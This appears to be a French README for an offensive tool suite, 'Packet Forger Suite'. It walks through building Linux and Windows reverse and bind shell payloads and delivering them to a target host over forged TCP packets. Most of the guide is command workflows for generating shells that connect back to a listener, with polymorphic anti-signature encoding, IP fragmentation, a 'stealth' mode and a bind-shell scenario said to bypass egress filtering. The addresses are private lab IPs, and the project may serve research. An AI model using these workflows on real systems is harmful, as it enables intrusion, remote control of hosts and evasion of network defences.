# 🔗 Guide d'Intégration - Packet Forger Suite

## Workflow Complet : Génération → Transport

### Étape 1 : Générer un Payload

```bash
cd packet-forger-payloads

# Linux reverse shell standard
./bin/payload-builder build linux reverse \
    --lhost 192.168.10.20 --lport 4444 \
    --output payload_linux.bin

# Windows reverse shell avec résolution dynamique d'API
./bin/payload-builder build windows reverse \
    --lhost 192.168.10.20 --lport 4444 \
    --output payload_windows.bin

# Linux reverse shell polymorphe (anti-signature)
./bin/payload-builder build linux reverse \
    --lhost 192.168.10.20 --lport 4444 \
    --polymorphic --output payload_poly.bin

# Linux bind shell
./bin/payload-builder build linux bind \
    --lport 4444 --output payload_bind.bin
```

**Résultat** : Fichiers `.bin` (payload binaire) + `.json` (metadata)

### Étape 2 : Transporter le Payload via le Core

```bash
cd ../packet-forger-core

# Transport basique
sudo ./bin/packet-forger-core \
    --payload ../packet-forger-payloads/payload_linux.bin \
    --target 192.168.10.5 \
    --port 80

# Transport avec options avancées
sudo ./bin/packet-forger-core \
    --payload ../packet-forger-payloads/payload_windows.bin \
    --target 192.168.10.5 \
    --port 445 \
    --transport-profile windows \
    --fragment \
    --stealth
```

## Séparation des Responsabilités

### `packet-forger-payloads`
- ✅ Génère des payloads binaires (.bin)
- ✅ Génère des metadata JSON (.json)
- ✅ Support Linux/Windows
- ✅ Support reverse/bind shell
- ✅ Options : polymorphic, asm, encode-xor
- ❌ **NE forge PAS de paquets réseau**

### `packet-forger-core`
- ✅ Forge des paquets TCP/IP bas niveau
- ✅ Handshake TCP RFC 793
- ✅ Encapsulation par service (HTTP, FTP, SMTP, SMB, Raw)
- ✅ Fragmentation IP
- ✅ Mode stealth (TTL/window variés)
- ✅ Transport de payloads opaques
- ❌ **NE génère PAS de shellcode**

## Interface de Communication

### Format de Payload
- **Binaire** : `.bin` (raw bytes, exécutable)
- **Metadata** : `.json` (platform, type, size, options)

### Exemple de Metadata JSON
```json
{
  "platform": "linux",
  "type": "reverse_shell",
  "size": 118,
  "polymorphic": false,
  "encoded": false,
  "lport": 4444,
  "lhost": "192.168.10.20"
}
```

## Exemples d'Utilisation

### Scénario 1 : Reverse Shell Linux Standard
```bash
# 1. Générer
cd packet-forger-payloads
./bin/payload-builder build linux reverse \
    --lhost 192.168.10.20 --lport 4444 \
    --output revshell.bin

# 2. Transporter
cd ../packet-forger-core
sudo ./bin/packet-forger-core \
    --payload ../packet-forger-payloads/revshell.bin \
    --target 192.168.10.5 --port 80
```

### Scénario 2 : Windows Reverse Shell Polymorphe
```bash
# 1. Générer
cd packet-forger-payloads
./bin/payload-builder build windows reverse \
    --lhost 192.168.10.20 --lport 4444 \
    --polymorphic --output win_poly.bin

# 2. Transporter avec fragmentation
cd ../packet-forger-core
sudo ./bin/packet-forger-core \
    --payload ../packet-forger-payloads/win_poly.bin \
    --target 192.168.10.5 --port 445 \
    --fragment --stealth
```

### Scénario 3 : Bind Shell (contourne egress filtering)
```bash
# 1. Générer
cd packet-forger-payloads
./bin/payload-builder build linux bind \
    --lport 4444 --output bind.bin

# 2. Transporter
cd ../packet-forger-core
sudo ./bin/packet-forger-core \
    --payload ../packet-forger-payloads/bind.bin \
    --target 192.168.10.5 --port 80
```

## Avantages de l'Architecture Modulaire

1. **Séparation claire** : Génération ≠ Transport
2. **Réutilisabilité** : Payloads utilisables par d'autres outils
3. **Maintenabilité** : Chaque module a un rôle précis
4. **Testabilité** : Tests indépendants par module
5. **Extensibilité** : Ajout de nouveaux types de payloads sans toucher au core

## Prochaines Étapes

- Phase 3 : Créer `packet-forger-labs/` avec CVE/POC
- Phase 4 : Créer `packet-forger-research/` avec documentation mémoire

---

**Note** : Le core et les payloads sont maintenant **complètement indépendants** et peuvent être utilisés séparément.

